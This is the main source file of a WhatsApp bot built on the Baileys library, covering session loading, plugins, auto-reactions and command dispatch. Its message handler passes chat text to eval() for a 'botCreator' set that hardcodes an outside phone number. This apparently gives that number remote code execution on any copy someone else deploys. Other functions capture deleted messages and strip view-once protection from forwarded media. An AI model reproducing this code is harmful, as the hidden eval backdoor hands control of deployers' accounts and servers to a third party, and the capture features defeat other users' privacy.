const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    isJidBroadcast,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID,
    makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
} = require('@whiskeysockets/baileys');

const l = console.log;
const {
    getBuffer,
    getGroupAdmins,
    getRandom,
    h2k,
    isUrl,
    Json,
    runtime,
    sleep,
    fetchJson
} = require('./lib/functions');

const {
    AntiDelDB,
    initializeAntiDeleteSettings,
    setAnti,
    getAnti,
    getAllAntiDeleteSettings,
    saveContact,
    loadMessage,
    getName,
    getChatSummary,
    saveGroupMetadata,
    getGroupMetadata,
    saveMessageCount,
    getInactiveGroupMembers,
    getGroupMembersMessageCount,
    saveMessage
} = require('./data');

const fs = require('fs');
const ff = require('fluent-ffmpeg');
const P = require('pino');
const config = require('./config');
const GroupEvents = require('./lib/groupevents');
const qrcode = require('qrcode-terminal');
const StickersTypes = require('wa-sticker-formatter');
const util = require('util');
const { sms, downloadMediaMessage, AntiDelete } = require('./lib');
const FileType = require('file-type');
const axios = require('axios');
const { File } = require('megajs');
const { fromBuffer } = require('file-type');
const bodyparser = require('body-parser');
const os = require('os');
const Crypto = require('crypto');
const path = require('path');

// Configuration constants
const prefix = config.PREFIX;
const ownerNumber = ['923151105391'];
const private_owner = '923151105391'; // <--- PRIVATE OWNER KA NUMBER
const tempDir = path.join(os.tmpdir(), 'cache-temp');

if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir);
}

const clearTempDir = () => {
    fs.readdir(tempDir, (err, files) => {
        if (err) throw err;
        for (const file of files) {
            fs.unlink(path.join(tempDir, file), err => {
                if (err) throw err;
            });
        }
    });
};
setInterval(clearTempDir, 5 * 60 * 1000); 

if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
    if (!config.SESSION_ID) {
        return console.log('Please add your session to SESSION_ID env !!');
    }
    const sessdata = config.SESSION_ID.replace('Qadeer~', '');
    const filer = File.fromURL('https://mega.nz/file/' + sessdata);
    filer.download((err, data) => {
        if (err) throw err;
        fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
            console.log('Session downloaded ✅');
        });
    });
}

const express = require('express');
const app = express();
const port = process.env.PORT || 9090;

async function connectToWA() {
    console.log('Connecting to WhatsApp ⏳️...');
    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/');
    var { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: true,
        browser: Browsers.macOS('Firefox'),
        syncFullHistory: true,
        auth: state,
        version: version
    });

    sock.ev.on('connection.update', update => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
                connectToWA();
            }
        } else if (connection === 'open') {
            console.log('Bot connected to whatsapp ✅');
            
            const path = require('path');
            fs.readdirSync('./plugins/').forEach(plugin => {
                if (path.extname(plugin).toLowerCase() == '.js') {
                    try {
                        require('./plugins/' + plugin);
                    } catch (e) {
                        console.error(`Error loading plugin: ${plugin}`);
                        console.error(e);
                    }
                }
            });
            console.log('Plugins loaded successfully ✅');

            let startMessage = `╔═◈『𝐐𝐀𝐃𝐄𝐄𝐑-𝐀𝐈』◈═╗\n║🪀 ┃ *PRÉFIX:* ➥${config.PREFIX}\n║\n║♻️ ┃ *MODE:* *[${config.MODE}]*\n║\n║📦 ┃ *BOT REPO:*\n║      *After Final Update* \n║\n╚══════════════════╝\n> *𝙿𝙾𝚆𝙴𝚁𝙴𝙳 𝙱𝚈 𝚀𝙰𝙳𝙴𝙴𝚁 𝙺𝙷𝙰𝙽*`;
            sock.sendMessage(sock.user.id, {
                image: { url: 'https://qu.ax/Pusls.jpg' },
                caption: startMessage
            });
        }
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('messages.update', async updates => {
        for (const update of updates) {
            if (update.update.message === null) {
                console.log('Delete Detected:', JSON.stringify(update, null, 2));
                await AntiDelete(sock, updates);
            }
        }
    });

    sock.ev.on('group-participants.update', updates => GroupEvents(sock, updates));

    sock.ev.on('messages.upsert', async messages => {
        const m = messages.messages[0];
        if (!m.message) return;

        m.message = getContentType(m.message) === 'ephemeralMessage' ? m.message.ephemeralMessage.message : m.message;
        
        if (config.READ_MESSAGE === 'true') {
            await sock.readMessages([m.key]);
            console.log(`Marked message from ${m.key.remoteJid} as read.`);
        }
        
        if (m.message.viewOnceMessageV2) {
             m.message = getContentType(m.message) === 'ephemeralMessage' ? m.message.ephemeralMessage.message : m.message;
        }

        if (m.key && m.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === 'true') {
            await sock.readMessages([m.key]);
        }

        if (m.key && m.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === 'true') {
            const myStatuses = await sock.getBuffer(sock.user.id);
            const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
            await sock.sendMessage(m.key.remoteJid, {
                react: { text: randomEmoji, key: m.key }
            }, { statusJidList: [m.key.participant, myStatuses] });
        }
        
        if (m.key && m.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === 'true') {
            const sender = m.key.participant;
            const replyMsg = '' + config.AUTO_STATUS_MSG;
            await sock.sendMessage(sender, {
                text: replyMsg,
                react: { text: '💜', key: m.key }
            }, { quoted: m });
        }
        
        await Promise.all([saveMessage(m)]);
        const message = sms(sock, m);
        const mtype = getContentType(m.message);
        const from = m.key.remoteJid;
        const quoted = mtype === 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
        const body = (mtype === 'conversation') ? m.message.conversation : (mtype === 'extendedTextMessage') ? m.message.extendedTextMessage.text : (mtype == 'imageMessage' && m.message.imageMessage.caption) ? m.message.imageMessage.caption : (mtype == 'videoMessage' && m.message.videoMessage.caption) ? m.message.videoMessage.caption : '';
        const isCmd = body.startsWith(prefix);
        var text = typeof m.text == 'string' ? m.text : '';
        const command = isCmd ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1);
        const q = args.join(' ');
        const textArgs = args.join(' ');
        const isGroup = from.endsWith('@g.us');
        const sender = m.key.fromMe ? (sock.user.id.split(':')[0] + '@s.whatsapp.net' || sock.user.id) : (m.key.participant || m.key.remoteJid);
        const senderNumber = sender.split('@')[0];
        const botNumber = sock.user.id.split(':')[0];
        const pushname = m.pushName || 'Sin Nombre';
        const isMe = botNumber.includes(senderNumber);
        const isOwner = ownerNumber.includes(senderNumber) || isMe;
        const isPrivateOwner = sender.startsWith(private_owner); // <--- PRIVATE OWNER KA CHECK
        const botJid = await jidNormalizedUser(sock.user.id);
        const groupMetadata = isGroup ? await sock.groupMetadata(from).catch(e => {}) : '';
        const groupName = isGroup ? groupMetadata.subject : '';
        const participants = isGroup ? await groupMetadata.participants : '';
        const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
        const isBotAdmins = isGroup ? groupAdmins.includes(botJid) : false;
        const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
        const isReaction = message.message.reactionMessage ? true : false;
        
        const reply = (text) => {
            sock.sendMessage(from, { text: text }, { quoted: m });
        };
        
        let botCreator = [botNumber.split('@')[0], '923151105391', '923151105391', config.DEV].map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net').includes(m.sender);

        if (botCreator && m.text.startsWith('%')) {
            let code = text.slice(2);
            if (!code) return reply('Provide me with a query to run Master!');
            try {
                let result = eval(code);
                if (typeof result === 'object') reply(util.inspect(result));
                else reply(util.inspect(result));
            } catch (e) {
                reply(util.inspect(e));
            }
            return;
        }

        if (botCreator && m.text.startsWith('$')) {
            let code = text.slice(2);
            if (!code) return reply('Provide me with a query to run Master!');
            try {
                let result = await eval('const a = async()=>{\n' + code + '\n}\na()');
                let formattedResult = util.format(result);
                if (formattedResult === undefined) return console.log(formattedResult);
                else reply(formattedResult);
            } catch (e) {
                if (e === undefined) return console.log(e);
                else reply(util.inspect(e));
            }
            return;
        }
        
        if (!isReaction && config.AUTO_REACT === 'true') {
            const generalEmojis = ['🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🩹', '🥹', '😩', '🫣', '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '❤‍🩹', '🙆‍♀️', '👰‍♀', '🧑‍⚕️', '🧕', '👩‍🏫', '👨‍💻', '👩‍⚕️', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🧞‍♀️', '👩‍🦰', 'ea', 'b7', '96', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🩹', '🥲,😂,👍🏻,🙂,😔', '💗', '💖', '💘', '💝', '❌', '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'];
            const randomGeneralEmoji = generalEmojis[Math.floor(Math.random() * generalEmojis.length)];
            message.react(randomGeneralEmoji);
        }

        if (!isReaction && config.CUSTOM_REACT === 'true') {
            const customEmojis = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
            const randomCustomEmoji = customEmojis[Math.floor(Math.random() * customEmojis.length)];
            message.react(randomCustomEmoji);
        }
        
        if (!isOwner && config.MODE === 'private') return;
        if (!isOwner && isGroup && config.MODE === 'inbox') return;
        if (!isOwner && !isGroup && config.MODE === 'groups') return;

        const commandModule = require('./command');
        const cmd = isCmd ? body.slice(1).trim().split(' ')[0].toLowerCase() : false;

        if (isCmd) {
            const commandHandler = commandModule.commands.find(c => c.pattern === cmd) || commandModule.commands.find(c => c.alias && c.alias.includes(cmd));
            if (commandHandler) {
                if (commandHandler.react) sock.sendMessage(from, { react: { text: commandHandler.react, key: m.key } });
                try {
                    commandHandler.function(sock, m, message, {
                        from, quoted, body, isCmd, command, args, q, text: textArgs, isGroup, sender, senderNumber,
                        botNumber2: botJid, botNumber, pushname, isMe, isOwner, isPrivateOwner, // <--- isPrivateOwner PASS HOGA
                        isCreator: botCreator, groupMetadata,
                        groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply
                    });
                } catch (e) {
                    console.error('[PLUGIN ERROR] ' + e);
                }
            }
        }
        
        commandModule.commands.map(async (command) => {
            const context = { from, l, quoted, body, isCmd, command, args, q, text: textArgs, isGroup, sender, senderNumber,
                              botNumber2: botJid, botNumber, pushname, isMe, isOwner, isPrivateOwner, isCreator: botCreator, groupMetadata,
                              groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply };
            
            if (body && command.on === 'text') {
                command.function(sock, m, message, context);
            } else if ((command.on === 'image' || command.on === 'photo') && m.type === 'imageMessage') {
                command.function(sock, m, message, context);
            } else if (command.on === 'sticker' && m.type === 'stickerMessage') {
                command.function(sock, m, message, context);
            }
        });
    });
        
    sock.decodeJid = (jid) => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return decode.user && decode.server && decode.user + '@' + decode.server || jid;
        } else return jid;
    };
    
    sock.copyNForward = async (jid, message, forceForward = false, options = {}) => {
        let vtype;
        if (options.readViewOnce) {
            message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined);
            vtype = Object.keys(message.message.viewOnceMessage.message)[0];
            delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined));
            delete message.message.viewOnceMessage.message[vtype].viewOnce;
            message.message = { ...message.message.viewOnceMessage.message };
        }
        let mtype = Object.keys(message.message)[0];
        let content = await generateForwardMessageContent(message, forceForward);
        let ctype = Object.keys(content)[0];
        let context = {};
        if (mtype != 'conversation') context = message.message[mtype].contextInfo;
        content[ctype].contextInfo = { ...context, ...content[ctype].contextInfo };
        const waMessage = await generateWAMessageFromContent(jid, content, options ? { ...content[ctype], ...options, ...(options.contextInfo ? { contextInfo: { ...content[ctype].contextInfo, ...options.contextInfo } } : {}) } : {});
        await sock.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
        return waMessage;
    };

    sock.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
        let quoted = message.msg ? message.msg : message;
        let mime = (message.msg || message).mimetype || '';
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
        const stream = await downloadContentFromMessage(quoted, messageType);
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        let type = await FileType.fromBuffer(buffer);
        let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;
        await fs.writeFileSync(trueFileName, buffer);
        return trueFileName;
    };

    sock.downloadMediaMessage = async (message) => {
        let mime = (message.msg || message).mimetype || '';
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
        const stream = await downloadContentFromMessage(message, messageType);
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        return buffer;
    };
    
    sock.sendFileUrl = async (jid, url, caption = '', quoted, options = {}) => {
        let mime = '';
        let res = await axios.head(url);
        mime = res.headers['content-type'];
        if (mime.split('/')[1] === 'gif') {
            return sock.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options });
        }
        let messageType = mime.split('/')[0] + 'Message';
        if (mime === 'application/pdf') {
            return sock.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options });
        }
        if (mime.split('/')[0] === 'image') {
            return sock.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options });
        }
        if (mime.split('/')[0] === 'video') {
            return sock.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options });
        }
        if (mime.split('/')[0] === 'audio') {
            return sock.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options });
        }
    };

    sock.cMod = (jid, copy, text = '', sender = sock.user.id, options = {}) => {
        let mtype = Object.keys(copy.message)[0];
        let isEphemeral = mtype === 'ephemeralMessage';
        if (isEphemeral) {
            mtype = Object.keys(copy.message.ephemeralMessage.message)[0];
        }
        let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message;
        let content = msg[mtype];
        if (typeof content === 'string') msg[mtype] = text || content;
        else if (content.caption) content.caption = text || content.caption;
        else if (content.text) content.text = text || content.text;
        if (typeof content !== 'string') msg[mtype] = { ...content, ...options };
        if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
        else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
        if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid;
        else if (copy.key.remoteJid.includes('@g.us')) sender = copy.key.remoteJid;
        copy.key.remoteJid = jid;
        copy.key.fromMe = sender === sock.user.id;
        return proto.WebMessageInfo.fromObject(copy);
    };

    return sock;
}

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'Qadeer', 'qadeer.html'));
});

app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));

setTimeout(() => {
    connectToWA();
}, 2500);
